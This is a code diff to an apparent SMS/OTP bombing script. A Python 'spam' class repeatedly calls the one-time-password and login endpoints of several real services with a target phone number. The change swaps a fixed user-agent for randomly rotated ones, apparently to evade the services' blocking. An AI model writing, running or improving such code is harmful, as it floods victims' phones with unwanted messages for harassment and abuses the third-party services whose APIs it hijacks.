@@ -19,13 +19,14 @@ import random
 import requests
 import time
 from colorama import Fore
+from utils.randomuser import users
 
 
 class spam:
     def __init__(self, number, count, throttle):
         url = ["https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20" + number, "https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" + str(91) + "&nod=4&phone=" + number, "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + number, "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + number]
         session = requests.session()
-        session.headers = ({'User-Agent': 'Token Transit/4.2.4 (Android 9; sdk 28; gzip) okhttp'})
+        session.headers = random.choice(users)
         req = session.get(random.choice(url))
 
         if req.status_code != 200:
